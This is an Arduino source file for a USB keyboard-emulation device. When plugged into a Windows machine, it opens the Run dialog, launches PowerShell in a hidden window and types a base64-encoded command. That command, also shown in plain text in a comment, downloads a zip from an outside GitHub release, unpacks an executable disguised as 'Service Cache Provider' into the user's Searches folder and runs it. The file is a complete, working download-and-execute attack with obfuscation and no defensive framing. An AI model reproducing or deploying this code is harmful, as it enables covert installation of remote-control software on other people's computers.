#include <Arduino.h>
#include <Keyboard.h>

/*
$zip="$env:TEMP\scp.zip";$dest="$env:USERPROFILE\Searches";Invoke-WebRequest -Uri "https://github.com/Fede-ai/Controller/releases/download/v0.1.0-alpha/Service Cache Provider.zip" -OutFile $zip;Expand-Archive -Path $zip -DestinationPath $dest -Force;Remove-Item $zip;Start-Process -FilePath (Join-Path $dest "Service Cache Provider\Service Cache Provider.exe");exit

$cmd = '...'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
*/

const char encoded[] PROGMEM = "JAB6AGkAcAA9ACIAJABlAG4AdgA6AFQARQBNAFAAXABzAGMAcAAuAHoAaQBwACIAOwAkAGQAZQBzAHQAPQAiACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABTAGUAYQByAGMAaABlAHMAIgA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8ARgBlAGQAZQAtAGEAaQAvAEMAbwBuAHQAcgBvAGwAbABlAHIALwByAGUAbABlAGEAcwBlAHMALwBkAG8AdwBuAGwAbwBhAGQALwB2ADAALgAxAC4AMAAtAGEAbABwAGgAYQAvAFMAZQByAHYAaQBjAGUAIABDAGEAYwBoAGUAIABQAHIAbwB2AGkAZABlAHIALgB6AGkAcAAiACAALQBPAHUAdABGAGkAbABlACAAJAB6AGkAcAA7AEUAeABwAGEAbgBkAC0AQQByAGMAaABpAHYAZQAgAC0AUABhAHQAaAAgACQAegBpAHAAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgBQAGEAdABoACAAJABkAGUAcwB0ACAALQBGAG8AcgBjAGUAOwBSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAkAHoAaQBwADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAKABKAG8AaQBuAC0AUABhAHQAaAAgACQAZABlAHMAdAAgACIAUwBlAHIAdgBpAGMAZQAgAEMAYQBjAGgAZQAgAFAAcgBvAHYAaQBkAGUAcgBcAFMAZQByAHYAaQBjAGUAIABDAGEAYwBoAGUAIABQAHIAbwB2AGkAZABlAHIALgBlAHgAZQAiACkAOwBlAHgAaQB0AA==";

void typeFromProgmem(const char *p) {
  for (uint16_t i = 0; ; ++i) {
    char c = (char)pgm_read_byte_near(p + i);
    if (c == 0) 
		break;

    Keyboard.write(c);
  }
}

void setup() {
	delay(2000);
	Keyboard.begin();

	Keyboard.press(KEY_LEFT_GUI);
	Keyboard.press('r');
	Keyboard.releaseAll();
	delay(2000);

	Keyboard.print("powershell");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	delay(3000);

	Keyboard.print("powershell -w hidden -EncodedCommand ");
  	typeFromProgmem(encoded);
	Keyboard.print(";exit");
	delay(300);

	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();

	delay(1000);
	Keyboard.end();
}

void loop() {
	delay(1000);
}
